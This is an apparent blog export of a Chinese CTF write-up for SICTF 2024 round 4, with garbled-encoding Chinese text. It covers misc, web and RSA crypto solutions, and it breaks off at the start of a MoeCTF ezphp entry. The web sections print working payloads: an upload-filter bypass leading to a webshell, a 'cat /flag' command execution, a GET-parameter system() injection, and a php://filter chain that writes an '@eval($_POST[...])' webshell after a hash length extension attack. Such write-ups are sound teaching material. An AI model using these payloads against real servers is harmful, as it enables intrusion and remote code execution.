<p>è‹¹æœä¸ºäº†è®© PNG æ ¼å¼çš„å›¾ç‰‡å¯ä»¥å¹¶è¡Œè§£ç å¹¶ä¸”å…¼å®¹åŸæœ¬çš„ PNG æ ‡å‡†ï¼ŒæŠŠå›¾ç‰‡å†…å®¹åˆ†ä¸ºã€Œå‰åŠã€ä¸ã€ŒååŠã€2 éƒ¨åˆ†ï¼Œå¹¶æŠŠåƒç´ æµåˆ†ä¸ºå¤šä¸ª IDAT å—ï¼Œç„¶ååœ¨ PNG æ–‡ä»¶é‡Œæ·»åŠ äº†ä¸€ä¸ª iDOT è¾…åŠ©å—ï¼Œå…¶ä¸­è®°å½•äº†ã€Œå‰åŠã€ã€ŒååŠã€çš„åˆ†éš”ä½ç½®ï¼ˆã€ŒååŠã€æ•°æ®ç›¸å¯¹ iDOT å—çš„åç§»å€¼ï¼‰å’Œè§£å‹åçš„åƒç´ é«˜åº¦ï¼Œè¿™æ ·ç”¨ Apple çš„ PNG ç¼–ç å™¨ç¼–ç çš„ PNG å›¾ç‰‡ç”¨ Apple è‡ªå®¶çš„ PNG è§£ç å™¨è§£ç å°±å¯ä»¥åˆ†ä¸º 2 ä¸ªå¹¶è¡Œçš„è¿‡ç¨‹ï¼Œä»¥æ­¤å……åˆ†åˆ©ç”¨å¤šæ ¸æ€§èƒ½ï¼ŒåŒæ—¶è¿™æ ·çš„ PNG å›¾ç‰‡ä¹Ÿèƒ½è¢«æ™®é€šè§£ç å™¨è§£ç </p>
<p>åŸç†å°±ä¸è¿‡å¤šåˆ†æäº†ï¼Œå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š</p>
<p><a href="https://zhuanlan.zhihu.com/p/447989118">ğŸ¦ åœ¨ä¸åŒè®¾å¤‡ä¸Šæ˜¾ç¤ºä¸ä¸€æ ·å†…å®¹çš„ç¥å¥‡ PNG å›¾ç‰‡ - çŸ¥ä¹</a></p>
<p>ç›´æ¥ç”¨åœ¨çº¿ç½‘ç«™çœ‹åˆ°</p>
<p><a href="https://fotoforensics.com/analysis.php?id=05826ce23b2159d5bff498a7756bba511d45b1d2.202681">https://fotoforensics.com/analysis.php?id=05826ce23b2159d5bff498a7756bba511d45b1d2.202681</a></p>
<p><img src="/2024/11/06/SICTF-2024-round4/5.jpg" alt="img"></p>
<p>è·å¾—éšæœºæ•°ç§å­ï¼Œè¿™é‡Œæ˜¯ä¼ªéšæœºæ•°ï¼Œå†™å‡ºè§£å¯†è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="number">496534891</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_file_as_bytes</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_data = f.read()</span><br><span class="line">        decrypted_data = <span class="built_in">bytes</span>((byte ^ random.randint(<span class="number">10</span>, <span class="number">20</span>) <span class="keyword">for</span> byte <span class="keyword">in</span> file_data))</span><br><span class="line">        <span class="keyword">return</span> decrypted_data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_bytes_to_file</span>(<span class="params">bytes_data, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(bytes_data)</span><br><span class="line">enc = decrypt_file_as_bytes(<span class="string">&quot;data&quot;</span>) </span><br><span class="line">write_bytes_to_file(enc, <span class="string">&quot;decrypted_deepsea.wav&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°deepsea.wavï¼Œç”¨deepsoundæ‰“å¼€ï¼Œè·å¾—ä¸€ä¸ªsea.wavæ–‡ä»¶ï¼ŒSSTVæ‰«æï¼Œæ‹¿åˆ°å‹ç¼©åŒ…key</p>
<p><img src="/2024/11/06/SICTF-2024-round4/6.jpg" alt="img"></p>
<p>è§£å‹å¾—åˆ°</p>
<p><img src="/2024/11/06/SICTF-2024-round4/7.jpg" alt="img"></p>
<p>æ–‡ä»¶åè¯´æ˜¯base2048ï¼Œç›´æ¥è§£å¯†</p>
<p><img src="/2024/11/06/SICTF-2024-round4/8.jpg" alt="img"></p>
<p>æ‹¿åˆ°flag</p>
<h2 id="Web-3-4"><a href="#Web-3-4" class="headerlink" title="Web(3&#x2F;4)"></a><strong>Web(3&#x2F;4)</strong></h2><h3 id="Upl0ad"><a href="#Upl0ad" class="headerlink" title="Upl0ad"></a><strong>Upl0ad</strong></h3><p>å³é”®æŸ¥çœ‹æºä»£ç </p>
<p>çœ‹åˆ°ä¸€ä¸ªjså‡½æ•°ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">validateFileType</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> fileInput = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;input[type=&quot;file&quot;]&#x27;</span>);</span><br><span class="line">        <span class="keyword">const</span> allowedExtensions = <span class="regexp">/(\.jpg|\.jpeg|\.png|\.pdf)$/i</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!allowedExtensions.<span class="title function_">exec</span>(fileInput.<span class="property">value</span>)) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&#x27;åªå…è®¸ä¸Šä¼  JPGã€PNG æˆ– PDF æ–‡ä»¶ã€‚&#x27;</span>);</span><br><span class="line">            fileInput.<span class="property">value</span> = <span class="string">&#x27;&#x27;</span>; <span class="comment">// æ¸…ç©ºé€‰æ‹©</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>å‰ç«¯è¿‡æ»¤ï¼Œåªå…è®¸ä¸Šä¼ jpg jpeg png pdfæ ¼å¼æ–‡ä»¶</p>
<p>ç®€å•çš„å‰ç«¯ç»•è¿‡ï¼Œæ–‡ä»¶ä¸Šä¼ ï¼Œç›´æ¥ä¼ é©¬bpæ”¹åç¼€ï¼š</p>
<p><img src="/2024/11/06/SICTF-2024-round4/9.jpg" alt="img"></p>
<p><img src="/2024/11/06/SICTF-2024-round4/10.jpg" alt="img"></p>
<p>ä¸Šä¼ æˆåŠŸï¼Œè·³è½¬åˆ°é¡µé¢ï¼Œç›´æ¥å‘½ä»¤æ‰§è¡Œå³å¯</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cmd=system(&quot;cat /flag&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="/2024/11/06/SICTF-2024-round4/11.jpg" alt="img"></p>
<h3 id="Sighin"><a href="#Sighin" class="headerlink" title="Sighin"></a><strong>Sighin</strong></h3><p>è¿›å…¥é¡µé¢ç›´æ¥çœ‹æºç </p>
<p><img src="/2024/11/06/SICTF-2024-round4/12.jpg" alt="img"></p>
<p>åˆ°robots.txtçœ‹ä¸€çœ¼</p>
<p>è¦æ±‚è®¿é—®&#x2F;wh3re_1s_thi5_fl4g.php</p>
<p><img src="/2024/11/06/SICTF-2024-round4/13.jpg" alt="img"></p>
<p>å†™å‡ºè§£å¯†è„šæœ¬</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$s</span> = <span class="string">&quot;wKq=1MDcLg6yYsrnRYivbO7JoWQ9rBhCZuo4DlZOS7_I5+t=UKzp0hdV1FNL2EFd/nxam3cTbPARsw+8Eky5XUpfH0MeTQ3JXtkGf9qj_4NmlHi/SeIVaCAgxGj26vW8PBzu&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$s</span>[<span class="number">72</span>] . <span class="variable">$s</span>[<span class="number">116</span>] . <span class="variable">$s</span>[<span class="number">76</span>] . <span class="variable">$s</span>[<span class="number">113</span>] . <span class="variable">$s</span>[<span class="number">124</span>] . <span class="variable">$s</span>[<span class="number">35</span>] . <span class="variable">$s</span>[<span class="number">104</span>] . <span class="variable">$s</span>[<span class="number">63</span>] . <span class="variable">$s</span>[<span class="number">91</span>] . <span class="variable">$s</span>[<span class="number">70</span>] . <span class="variable">$s</span>[<span class="number">24</span>] . <span class="variable">$s</span>[<span class="number">63</span>] . <span class="variable">$s</span>[<span class="number">113</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$s</span>[<span class="number">38</span>] . <span class="variable">$s</span>[<span class="number">123</span>] . <span class="variable">$s</span>[<span class="number">115</span>] . <span class="variable">$s</span>[<span class="number">89</span>] . <span class="variable">$s</span>[<span class="number">96</span>] . <span class="variable">$s</span>[<span class="number">60</span>] . <span class="variable">$s</span>[<span class="number">75</span>] . <span class="variable">$s</span>[<span class="number">108</span>] . <span class="variable">$s</span>[<span class="number">32</span>] . <span class="variable">$s</span>[<span class="number">107</span>] . <span class="variable">$s</span>[<span class="number">37</span>] . <span class="variable">$s</span>[<span class="number">131</span>] . <span class="variable">$s</span>[<span class="number">38</span>] . <span class="variable">$s</span>[<span class="number">25</span>] . <span class="variable">$s</span>[<span class="number">75</span>] . <span class="variable">$s</span>[<span class="number">100</span>] . <span class="variable">$s</span>[<span class="number">63</span>] . <span class="variable">$s</span>[<span class="number">68</span>] . <span class="variable">$s</span>[<span class="number">57</span>] . <span class="variable">$s</span>[<span class="number">11</span>] . <span class="variable">$s</span>[<span class="number">70</span>] . <span class="variable">$s</span>[<span class="number">77</span>] . <span class="variable">$s</span>[<span class="number">3</span>] . <span class="variable">$s</span>[<span class="number">3</span>];</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$s</span>[<span class="number">96</span>] . <span class="variable">$s</span>[<span class="number">89</span>] . <span class="variable">$s</span>[<span class="number">63</span>] . <span class="variable">$s</span>[<span class="number">62</span>] . <span class="variable">$s</span>[<span class="number">115</span>] . <span class="variable">$s</span>[<span class="number">74</span>] . <span class="variable">$s</span>[<span class="number">47</span>] . <span class="variable">$s</span>[<span class="number">47</span>];</span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$payload</span> = <span class="variable">$s</span>[<span class="number">115</span>].<span class="variable">$s</span>[<span class="number">65</span>].<span class="variable">$s</span>[<span class="number">86</span>].<span class="variable">$s</span>[<span class="number">39</span>].<span class="variable">$s</span>[<span class="number">70</span>].<span class="variable">$s</span>[<span class="number">4</span>].<span class="variable">$s</span>[<span class="number">108</span>].<span class="variable">$s</span>[<span class="number">124</span>].<span class="variable">$s</span>[<span class="number">26</span>].<span class="variable">$s</span>[<span class="number">65</span>].<span class="variable">$s</span>[<span class="number">16</span>].<span class="variable">$s</span>[<span class="number">116</span>].<span class="variable">$s</span>[<span class="number">115</span>].<span class="variable">$s</span>[<span class="number">103</span>].<span class="variable">$s</span>[<span class="number">98</span>].<span class="variable">$s</span>[<span class="number">77</span>].<span class="variable">$s</span>[<span class="number">92</span>].<span class="variable">$s</span>[<span class="number">48</span>].<span class="variable">$s</span>[<span class="number">12</span>].<span class="variable">$s</span>[<span class="number">44</span>].<span class="variable">$s</span>[<span class="number">115</span>].<span class="variable">$s</span>[<span class="number">62</span>].<span class="variable">$s</span>[<span class="number">58</span>].<span class="variable">$s</span>[<span class="number">55</span>].<span class="variable">$s</span>[<span class="number">92</span>].<span class="variable">$s</span>[<span class="number">37</span>].<span class="variable">$s</span>[<span class="number">55</span>].<span class="variable">$s</span>[<span class="number">40</span>].<span class="variable">$s</span>[<span class="number">116</span>].<span class="variable">$s</span>[<span class="number">71</span>].<span class="variable">$s</span>[<span class="number">16</span>].<span class="variable">$s</span>[<span class="number">83</span>].<span class="variable">$s</span>[<span class="number">92</span>].<span class="variable">$s</span>[<span class="number">48</span>].<span class="variable">$s</span>[<span class="number">75</span>].<span class="variable">$s</span>[<span class="number">23</span>].<span class="variable">$s</span>[<span class="number">5</span>].<span class="variable">$s</span>[<span class="number">74</span>].<span class="variable">$s</span>[<span class="number">47</span>].<span class="variable">$s</span>[<span class="number">47</span>];</span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$g</span> = <span class="variable">$a</span>(<span class="variable">$a</span>(<span class="variable">$e</span>));</span><br><span class="line"><span class="variable">$h</span> = <span class="variable">$s</span>[<span class="number">17</span>].<span class="variable">$s</span>[<span class="number">130</span>].<span class="variable">$s</span>[<span class="number">106</span>].<span class="variable">$s</span>[<span class="number">76</span>].<span class="variable">$s</span>[<span class="number">113</span>].<span class="variable">$s</span>[<span class="number">68</span>].<span class="variable">$s</span>[<span class="number">75</span>].<span class="variable">$s</span>[<span class="number">109</span>].<span class="variable">$s</span>[<span class="number">55</span>].<span class="variable">$s</span>[<span class="number">65</span>].<span class="variable">$s</span>[<span class="number">26</span>].<span class="variable">$s</span>[<span class="number">47</span>];</span><br><span class="line"><span class="variable">$i</span> = <span class="variable">$a</span>(<span class="variable">$a</span>(<span class="variable">$h</span>));</span><br><span class="line"><span class="comment">//$i($f()[$a($c)][$g]); </span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>,<span class="variable">$b</span>,<span class="variable">$c</span>,<span class="variable">$e</span>,<span class="variable">$f</span>,<span class="variable">$g</span>,<span class="variable">$h</span>,<span class="variable">$i</span>);</span><br></pre></td></tr></table></figure>

<p>åŠ å¯†æ‰§è¡Œï¼Œè§£å¯†ä»¥åæ˜¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">get_defined_vars</span>()[_GET][W3lc0me_t0_SICTF.<span class="number">2024</span>]);</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥GETä¼ å‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?W3lc0me[t0_SICTF.2024=cat /flag</span><br></pre></td></tr></table></figure>

<p>å‘½ä»¤æ‰§è¡Œï¼Œè¿™é‡Œ.å·å±äºç‰¹æ®Šå­—ç¬¦ï¼Œç”¨ [ æ¥ç»•è¿‡php7ä»¥ä¸‹çš„å˜é‡åç‰¹æ®Šå­—ç¬¦è‡ªåŠ¨è½¬æ¢</p>
<h3 id="Die-for-now"><a href="#Die-for-now" class="headerlink" title="Die for now"></a><strong>Die for now</strong></h3><p>çœ‹ä¸€çœ¼</p>
<p><img src="/2024/11/06/SICTF-2024-round4/14.jpg" alt="img"></p>
<p>å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»ï¼Œè¯•ä¸€ä¸‹</p>
<p>å·¥å…·é“¾æ¥ï¼š<a href="https://github.com/shellfeel/hash-ext-attack">https://github.com/shellfeel/hash-ext-attack</a></p>
<p>123.txtå¸¦å‡ºsecret.phpçš„å€¼</p>
<p><img src="/2024/11/06/SICTF-2024-round4/15.jpg" alt="img"></p>
<p>ä¼ å‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hash=b7dd1b3c6b6dcc52a01f808e31e9d21c&amp;content=gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcAAAAAAAAAAxW1sxMjMudHh0</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹123.txt</p>
<p><img src="/2024/11/06/SICTF-2024-round4/16.png" alt="img"></p>
<p>æ­»äº¡ä»£ç ç»•è¿‡</p>
<p>å¯ä»¥å‚è€ƒè¿™ç¯‡åšå®¢ï¼š</p>
<p><a href="https://www.anquanke.com/post/id/202510#h3-18">æ¢ç´¢php:&#x2F;&#x2F;filteråœ¨å®æˆ˜å½“ä¸­çš„å¥‡æŠ€æ·«å·§-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å°</a></p>
<p>Bypass</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">exit</span>(); </span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+/../Qftm.php</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œbase64å››ä½è§£ç ï¼Œç›´æ¥ç ´å&lt;?ç­‰ç¬¦å·ç»“æ„ï¼Œç»•è¿‡æ­»äº¡ä»£ç åä¼ é©¬ï¼Œå‘½ä»¤æ‰§è¡Œ</p>
<p>Payload:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hash=d698e9ead3bbf847e4b83c78731e7400&amp;content=gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcAAAAAAAAAAxW1twaHA6Ly9maWx0ZXIvd3JpdGU9c3RyaW5nLnN0cmlwX3RhZ3N8Y29udmVydC5iYXNlNjQtZGVjb2RlL3Jlc291cmNlPT8+UEQ5d2FIQWdRR1YyWVd3b0pGOVFUMU5VVzFGbWRHMWRLVDgrLy4uL1FmdG0ucGhw</span><br></pre></td></tr></table></figure>

<p> è®¿é—®Qftm.phpï¼Œä¼ å‚å‘½ä»¤æ‰§è¡Œ</p>
<p><img src="/2024/11/06/SICTF-2024-round4/17.jpg" alt="img"></p>
<h2 id="Crypto-3-4"><a href="#Crypto-3-4" class="headerlink" title="Crypto(3&#x2F;4)"></a><strong>Crypto(3&#x2F;4)</strong></h2><h3 id="SignBase"><a href="#SignBase" class="headerlink" title="SignBase"></a><strong>SignBase</strong></h3><p>ç®€å•é¢˜ï¼Œbase64è§£ç æ‹¿flag</p>
<h3 id="Smooth"><a href="#Smooth" class="headerlink" title="Smooth"></a><strong>Smooth</strong></h3><p>çœ‹é¢˜ç›®åå’Œå†…å®¹ï¼Œåº”è¯¥æ˜¯RSA p-1å…‰æ»‘ï¼Œå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« </p>
<p><a href="https://blog.csdn.net/m0_62506844/article/details/125774485?app_version=6.3.8&code=app_1562916241&csdn_share_tail=%7B%22type%22:%22blog%22,%22rType%22:%22article%22,%22rId%22:%22125774485%22,%22source%22:%222301_80093366%22%7D&uLinkId=usr1mkqgl919blen&utm_source=app">RSA p+1æˆ–p-1å…‰æ»‘_p-1å…‰æ»‘æ•°-CSDNåšå®¢</a></p>
<p>ç›´æ¥è´´expï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2 </span><br><span class="line">N = <span class="number">11353462911659482113796537452147300926058319193410149519981293344545095869273822230953023429933867057788424748612924709948861133348747189832397098293375764081790597820832766019459982124608221261607650511397189714784056313299551817534654742174637343804047231232241364089289257964139944018168155573510980260130960125621306919129390727418251555408239157881843225479158237727969284756513805560836003067115936987292751142016846824024901372913577548599978847860303760659677939193351221798796221804998385095596961591093782162020167439948314063423204757741472210008357888290333170757522814768955797167174930629344666183821709125207308525214263797625499327774875517941662523738827284067304929843343871569023248931759251331056863803201916908875256305736551124386988450879913404808869417817363510363373493093139804372817316366990863872781848240937733101758906281563575413208242901819275013539759479445299894840593737457394207415306989963459347994339058584475533786264375696277942369426844216474662828121334192775480587740071776080691560820922589751966526187341539255661442517814436944781114380877453502120302247547983180059537220197840688418898830571100216529994749464486853212098379822895838120836692532849021875818941979891105837972315129986493</span></span><br><span class="line">c = <span class="number">4598142980961588614870523368474306387497434303187254927457676265871592231881441246092917258758503624096206624791819316260705668875764048374035213672138915662719877795747211803584360349151646264274341548770123417923229997374982757324397146348908248704115062655445309042278469908831635522908894918382861563762003781223067210316435231509359575745828484177064520417698784251000631935361105284031848497200100561554984257265297077176545082009710252149167922123535451717313588884862304552508619154651546264753192894485610685402565486840707709012364088270364787452130288293053818329408433642977483320525542674345001200312959241276966417288770125166249156122793451000156544563900072606708005901579238109781720805374132101363788622676000360345128868422751829657184702090198806325558601552728909032627597688702884484377994243047876011323705947461799669488497113582621976154428096812072612119422667669321557427061098391558516935530727451865151957035156100271891977310043273298085691419672779758845492888551759393825925266903887942750052210444677062600227218953570162640164207895883301679126000642791876167281967081725589618329012476305157314322062703122134504285038691938912783524944917966615556902938825590064899700174139252191278691620663355243</span></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">a = <span class="number">2</span></span><br><span class="line">n = <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    a = <span class="built_in">pow</span>(a, n, N)</span><br><span class="line">    res = gmpy2.gcd(a-<span class="number">1</span>, N)</span><br><span class="line">    <span class="keyword">if</span> res != <span class="number">1</span> <span class="keyword">and</span> res != N:</span><br><span class="line">        q = N // res</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;p=&quot;</span>,res)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;q=&quot;</span>,q)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    n += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">d=gmpy2.invert(e,(res-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,N)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment">#SICTF&#123;d8af7f58-49f7-490d-be49-386b8ff16361&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="next-prime"><a href="#next-prime" class="headerlink" title="next_prime"></a><strong>next_prime</strong></h3><p>è§£æ–¹ç¨‹ç»„ï¼Œp qæŒ¨å¾—å¾ˆè¿‘ï¼Œå¯ä»¥ç”¨è´¹é©¬åˆ†è§£</p>
<p>2021å¹´â€œç»¿åŸæ¯â€ç½‘ç»œå®‰å…¨å¤§èµ›-Crypto-RSA2-PLUSåŸé¢˜è„šæœ¬èƒ½ç›´æ¥æ‰“</p>
<p>expå¦‚ä¸‹ï¼š</p>
<p>å…ˆåˆ†è§£</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fermat_factorization</span>(<span class="params">n</span>):</span><br><span class="line">    factor_list = []</span><br><span class="line">    a = gmpy2.iroot(n, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line">        b2 = a * a - n</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> gmpy2.is_square(b2):</span><br><span class="line">            b2 = gmpy2.mpz(b2)</span><br><span class="line">            b, xflag = gmpy2.iroot(b2, <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">assert</span> xflag</span><br><span class="line">            factor_list.append([a + b, a - b])</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(factor_list) == <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> factor_list</span><br><span class="line"></span><br><span class="line">n1 = <span class="number">143003048136494625720615623612005913472507924053937690079082986485649969355472743235179770036996193641198750946508667945561623931811236977039763581123681134310890547763107653222776992418543178066390387385209825190685606728024120446212807710589806258669458993047631033905702244902809204039169931629358263456702579067559691338668237882496453568585374905432631312417129535623987837367199215661733043851565981435234933986864857569158677737153423060041120732727135186371678287680926662892691327401787213342106281956461499522723795617869239148528294553548775690229067500104867437905746412645684721821428282431567702986879179533855920546700706123995719114359958306882907020982377260255340490340263938995699635287224549324332962230238510191824829224191551900441011605052418697617085549543103391184965537110312684637038510114533398510307173011690076219892318860903556489256383303693074652155424333388152193775840529985682153395008472897617946636734810609200156268438329402662168752285341847607694230848883249991722691539384542468611397615969487669898094687344847452861774236267516878551680397732564006255256825307533960791695267034807439791627895625581061889926276814228469856614838307012696777026973517086921078389474757196549594972814371353</span></span><br><span class="line"></span><br><span class="line">factor_list = fermat_factorization(n1)</span><br><span class="line">X1, Y1 = factor_list[<span class="number">0</span>]</span><br><span class="line">X2, Y2 = factor_list[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> X1 * Y1 == n1</span><br><span class="line"><span class="keyword">assert</span> X2 * Y2 == n1</span><br><span class="line"></span><br><span class="line">p = gmpy2.gcd(X1, X2)</span><br><span class="line">q = X1 // p</span><br><span class="line">p1 = gmpy2.gcd(Y1, Y2)</span><br><span class="line">q1 = Y1 // p1</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p =&#x27;</span>, p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q =&#x27;</span>, q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p1 =&#x27;</span>, p1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q1 =&#x27;</span>, q1)</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°ä¸¤ç»„p qï¼Œå¸¸è§„RSAè§£å¯†ï¼Œæ…¢æ…¢è¯•ï¼Œæ‹¿åˆ°flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">q = <span class="number">113787980601251745826843877382579552614648689857848904057572059325440944465611640163147176996118167635079365778546506624499634252375260044431411000949865475313224316650494893792164068973839036934191662707067777255376224926590339831443832304095551258919095844512924220523460823214952758504127950314742622077043</span></span><br><span class="line">p = <span class="number">105093597128835439479657061236111691975605383355129363600351480053850707028369723338526666770974606911527798737164915958103082313581695026637245098382021718070694325314274439104912172972661654273602405666361761211778169903604127876997716201210879207713092042764119984813765613769539486499321202923341006511223</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">10602368727908312334676265892975307612231309319511015017178654564186172749979627738052483995870388025140270600159107954524376993980949045647370337520644299969292550299798129717198074042121264370311983929042594290226321121639097714569204574387632530578153623781118813035223106106430716561113649761388347227207862016222328885951443891878767280730866193302995220736592745950808566359750940949520997722511969961743175777398751576595421456387998438214806188903746057855596476380404784738717555105866919649086601807350830108805521710188675565963765427930594177874353694184805979235854934856122125278853834603734029710968348</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 40600296529065757616876034307502386207424439675894291036278463517602256790833</span></span><br><span class="line">n = q*p</span><br><span class="line"><span class="comment"># print(n)</span></span><br><span class="line">d = gmpy2.invert(e, (p -<span class="number">1</span>) * (q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;d=&quot;</span>,d)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;m=&quot;</span>,m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment">#SICTF&#123;f2a3af27-ad07-4fc2-9b69-a91304eee6a3&#125;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>æ¯”èµ›writeup</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>misc</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>phpå˜é‡é—´æ¥å¼•ç”¨</title>
    <url>/2024/11/11/php%E5%8F%98%E9%87%8F%E9%97%B4%E6%8E%A5%E5%BC%95%E7%94%A8/</url>
    <content><![CDATA[<h1 id="MoeCTF-2022-ezphp"><a href="#MoeCTF-2022-ezphp" class="headerlink" title="[MoeCTF 2022]ezphp"></a>[MoeCTF 2022]ezphp</h1><p>è®°ä¸€æ¬¡phpå˜é‡é—´æ¥å¼•ç”¨</p>
<p>é¢˜ç›®æ¥æºï¼š[<a href="https://www.nssctf.cn/problem/3348">MoeCTF 2022]ezphp | NSSCTF</a></p>
<span id="more"></span>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;source.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;xxxxxxxx&#x27;</span>;</span><br><span class="line"><span class="variable">$giveme</span> = <span class="string">&#x27;can can need flag!&#x27;</span>;</span><br><span class="line"><span class="variable">$getout</span> = <span class="string">&#x27;No! flag.Try again. Come on!&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$giveme</span>);</span><br><span class="line">&#125;</span><br><span 